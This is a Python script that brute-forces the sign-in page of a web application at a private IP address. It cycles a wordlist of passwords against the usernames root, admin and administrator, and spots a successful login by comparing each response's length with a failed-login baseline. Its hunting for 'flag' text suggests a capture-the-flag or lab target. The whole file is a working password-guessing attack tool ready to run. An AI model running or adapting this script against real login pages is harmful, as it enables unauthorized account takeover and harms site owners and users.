#!/usr/bin/env python3
"""Brute-force the signin page at http://10.11.200.229/?page=signin

Usage:
    python3 bruteforce.py [--wordlist wordlist.txt]
"""

import os
import sys
import time
import urllib.request
import urllib.parse

TARGET = "http://10.11.200.229/?page=signin"
DEFAULT_WORDLIST = os.path.join(os.path.dirname(__file__), "wordlist.txt")
USERNAMES = ["root", "admin", "administrator"]
LOGIN_PARAMS = {"Login": "Login"}


def load_wordlist(path: str) -> list[str]:
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]


def probe_failure() -> tuple[int, str]:
    params = dict(LOGIN_PARAMS, username="___nonexistent___", password="___wrong___")
    url = TARGET + "&" + urllib.parse.urlencode(params)
    resp = urllib.request.urlopen(url)
    body = resp.read()
    return len(body), body.decode(resp.headers.get_content_charset() or "utf-8")


def try_login(username: str, password: str) -> tuple[int, str]:
    params = dict(LOGIN_PARAMS, username=username, password=password)
    url = TARGET + "&" + urllib.parse.urlencode(params)
    resp = urllib.request.urlopen(url)
    body = resp.read()
    return len(body), body.decode(resp.headers.get_content_charset() or "utf-8")


def is_success(fail_len: int, fail_body: str, body_len: int, body: str) -> bool:
    if body_len != fail_len:
        return True
    if "flag" in body.lower():
        return True
    return False


def main() -> None:
    wordlist_path = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_WORDLIST

    print("[*] Probing failure response …", flush=True)
    fail_len, fail_body = probe_failure()
    print(f"[*] Failure baseline: {fail_len} bytes", flush=True)

    passwords = load_wordlist(wordlist_path)
    print(f"[*] Loaded {len(passwords)} passwords, trying {len(USERNAMES)} username(s)\n", flush=True)

    start = time.time()
    total = 0

    for username in USERNAMES:
        for password in passwords:
            total += 1
            try:
                body_len, body = try_login(username, password)
            except Exception as e:
                print(f"  [!] Error: {e}", flush=True)
                continue

            if is_success(fail_len, fail_body, body_len, body):
                elapsed = time.time() - start
                # Try to extract flag
                import re
                m = re.search(r'(?i)(?:flag|The flag is)[^<]*', body)
                detail = f" -> {m.group()}" if m else " (response differs from failure)"
                print(f"\n[+] SUCCESS after {total} attempts ({elapsed:.1f}s)")
                print(f"    username = {username}")
                print(f"    password = {password}{detail}", flush=True)
                print("\n[*] Full response snippet:\n")
                # Print lines around the flag/match
                for line in body.splitlines():
                    stripped = line.strip()
                    if "flag" in stripped.lower():
                        print(f"  {stripped}")
                return

            if total % 100 == 0:
                elapsed = time.time() - start
                rate = total / elapsed
                print(f"  [{total}] {username}:{password}  ({rate:.0f} req/s)", flush=True)

    elapsed = time.time() - start
    print(f"\n[-] No match found after {total} attempts ({elapsed:.1f}s)", flush=True)


if __name__ == "__main__":
    main()
